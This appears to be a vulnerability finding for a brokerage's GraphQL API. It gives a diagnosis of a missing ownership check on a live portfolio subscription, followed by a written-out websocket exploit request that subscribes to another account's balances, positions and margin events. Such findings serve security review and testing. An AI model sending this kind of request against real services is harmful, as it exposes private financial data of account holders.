diagnosis: The subscription handler connects directly to a dynamic Redis pub/sub channel using args.portfolioId. Because it never checks context.user against the portfolio's account owner, an attacker can subscribe to real-time equity balances, open positions, and margin call events of high-net-worth trading accounts.
exploit_request:
POST /graphql HTTP/1.1
Host: trading.brokerage.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Protocol: graphql-ws

{"type": "start", "id": "1", "payload": {"query": "subscription { portfolioValuationLive(portfolioId: \"pf_institutional_882\") }"}}
